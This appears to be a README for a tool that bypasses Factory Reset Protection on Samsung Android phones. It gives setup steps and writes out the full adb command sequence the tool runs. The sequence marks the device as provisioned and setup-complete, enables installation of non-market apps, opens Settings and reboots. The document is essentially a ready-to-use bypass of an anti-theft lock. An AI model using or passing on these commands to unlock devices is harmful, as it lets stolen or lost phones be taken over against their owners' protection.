# Samsung FRP Bypass
- Make sure you have all the dependencies listed in `requirements.txt` installed
  - Install them using `pip install -r requirements.txt`
- You can simply plug the samsung over USB and run `python main.py`

## frp.bin
### runs the following commands in adb

settings put global setup_wizard_has_run 1<br>
settings put secure user_setup_complete 1<br>
content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1<br>
content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1<br>
content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1<br>
am start -c android.intent.category.HOME -a android.intent.action.MAIN<br>
Wait 5 sec<br>
am start -n com.android.settings/com.android.settings.Settings<br>
Wait 5 sec<br>
reboot
